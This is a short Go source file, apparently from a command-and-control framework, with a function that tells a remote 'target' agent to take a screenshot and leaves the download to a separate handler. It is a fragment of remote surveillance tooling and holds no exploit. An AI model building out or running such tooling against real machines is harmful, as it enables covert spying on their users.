package cc

// TakeScreenshot take a screenshot of selected target, and download it
// open the picture if possible
func TakeScreenshot() {
	// tell agent to take screenshot
	err := SendCmdToCurrentTarget("screenshot")
	if err != nil {
		CliPrintError("send screenshot cmd: %v", err)
		return
	}

	// then we handle the cmd output in agentHandler
}
